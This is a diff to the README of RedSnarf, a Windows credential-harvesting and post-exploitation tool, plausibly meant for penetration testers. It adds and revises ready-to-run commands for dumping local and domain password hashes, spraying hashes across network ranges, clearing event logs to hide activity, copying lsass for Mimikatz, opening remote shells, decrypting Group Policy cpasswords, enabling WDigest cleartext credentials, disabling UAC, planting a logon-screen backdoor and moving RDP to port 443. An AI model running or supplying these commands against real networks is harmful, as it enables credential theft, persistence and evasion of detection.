@@ -26,12 +26,18 @@ o	Credsfile will accept a mix of pwdump, fgdump and plain text username and pass
 •	The ability to clear the event logs (application, security, setup or system); (Internal Version only)
 •	Results are saved on a per-host basis for analysis.
 •	Enable/Disable RDP on a remote machine.
+•	Change RDP port from 3389 to 443 on a remote machine.
 •	Enable/Disable NLA on a remote machine.
 •	Find where users are logged in on remote machines.
+•	Backdoor Windows Logon Screen
+•	Enable/Disable UAC on a remote machine.
 •	Stealth mimikatz added.
+•	Parsing of domain hashes
+•	Ability to determine which accounts are enabled/disabled
 
 RedSnarf Usage
 =======================
+
 Requirements:
 Impacket v0.9.16-dev - https://github.com/CoreSecurity/impacket.git
 CredRetrieve 7 - https://github.com/Neohapsis/credRetrieve7
@@ -46,76 +52,84 @@ Show Help
 
 Retrieve Local Hashes
 =======================
+
+Retrieve Local Hashes from a single machine using weak local credetials and clearing the Security event log
+./redsnarf.py -H ip=10.0.0.50 -uC security
+
+Retrieve Local Hashes from a single machine using weak local credetials and clearing the application event log
+./redsnarf.py -H ip=10.0.0.50 -uC application
+
 Retrieve Local Hashes from a single machine using local administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D .
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d .
 
 Retrieve Local Hashes from a single machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com
 
 Retrieve Hashes across a network range using local administrator credentials
-./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D .
+./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d .
 
 Retrieve Hashes across a network range using domain administrator credentials
-./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com
+./redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com
 
 Retrieve Hashes across a network range using domain administrator credentials
-./redsnarf.py -H file=targets.txt -u administrator -p Password01 -D yourdomain.com
+./redsnarf.py -H file=targets.txt -u administrator -p Password01 -d yourdomain.com
 
 Hash Spraying
 =======================
+
 Spray Hashes across a network range 
-./redsnarf.py -H range=10.0.0.1/24 -hS credsfile -D .
+./redsnarf.py -H range=10.0.0.1/24 -hS credsfile -d .
 
 Retrieve Hashes across a network range domain login
-./redsnarf.py -H range=10.0.0.1/24 -hS credsfile -D yourdomain.com
+./redsnarf.py -H range=10.0.0.1/24 -hS credsfile -d yourdomain.com
+
 
 Retrieve Domain Hashes
 =======================
+
 Retrieve Hashes using drsuapi method (Quickest)
-./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -hI y
+This method supports an optional flag of -q y which will query LDAP and output whether accounts are live or disabled
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -hI y (-hQ y)
 
 Retrieve Hashes using NTDSUtil
-./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -hN y
+This method supports an optional flag of -q y which will query LDAP and output whether accounts are live or disabled
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -hN y (-hQ y)
 
-Mimikatz 
-=======================
-Mass mimikatz
-./redsnarf.py -H ip=10.0.0.1 -cS y -hM y
-
-Stealth mimikatz (spins a web server - serves powershell and executes)
-./redsnarf.py -H ip=10.0.0.1 -cS y -hR y
 
 Information Gathering
 =======================
+
 Copy the Policies and Scripts folder from a Domain Controller and parse for password and administrator
-./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -D yourdomain.com -uP y
+./redsnarf.py -H ip=10.0.0.1 -u administrator -p Password01 -d yourdomain.com -uP y
 
 Decrypt Cpassword
 ./redsnarf.py -uG cpassword
 
 Find User - Live
-/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -eL user.name
+/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com -eL user.name
 
 Find User - Offline (searches pre downloaded information)
-/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -D yourdomain.com -eO user.name
+/redsnarf.py -H range=10.0.0.1/24 -u administrator -p Password01 -d yourdomain.com -eO user.name
+
 
 Misc
 =======================
+
 Start a Shell on a machine using local administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -uD y
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d . -uD y
 
 Start a Shell on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -uD y
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -uD y
 
 Retrieve a copy of lsass for offline parsing with Mimikatz on a machine using local administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D . -hL y
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d . -hL y
 
 Run Custom Command
 Example 1
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -uX 'net user'
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -uX 'net user'
 
 Example 2 - Double Quotes need to be escaped with \
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -uX 'dsquery group -name \"domain admins\" | dsget group -members -expand'
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -uX 'dsquery group -name \"domain admins\" | dsget group -members -expand'
 
 Local Access Token Policy
 Creates a batch file lat.bat which you can copy and paste to the remote machine to execute which will modify the registry and either enable or disable Local Access Token Policy settings.
@@ -123,44 +137,63 @@ Creates a batch file lat.bat which you can copy and paste to the remote machine 
 
 Wdigest
 Enable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rW e
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rW e
 
 Disable UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rW d
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rW d
 
 Query UseLogonCredential Wdigest registry value on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rW q
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rW q
+
+UAC
+Enable UAC registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rU e
+
+Disable UAC registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rU d
+
+Query UAC registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rU q
+
+Backdoor - Backdoor Windows Screen - Press Left Shift + Left Alt + Print Screen to activate
+Enable Backdoor registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rB e
+
+Disable Backdoor registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rB d
+
+Query Backdoor registry value on a machine using domain administrator credentials
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rB q
+
 
 RDP
 =======================
-
 RDP
 Enable RDP on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rR e
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rR e
 
 Disable RDP on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rR d
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rR d
 
 Query RDP status on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rR q
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rR q
 
 Change RDP Port from 3389 to 443 - Change RDP Port to 443 on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rT e
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rT e
 
 Change RDP Port to default of 3389 on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rT d
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rT d
 
 Query RDP Port Value on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rT q
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rT q
 
 NLA
 =======================
-
 Enable NLA on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rN e
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rN e
 
 Disable NLA on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rN d
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rN d
 
 Query NLA status on a machine using domain administrator credentials
-./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -D yourdomain.com -rN q
+./redsnarf.py -H ip=10.0.0.50 -u administrator -p Password01 -d yourdomain.com -rN q
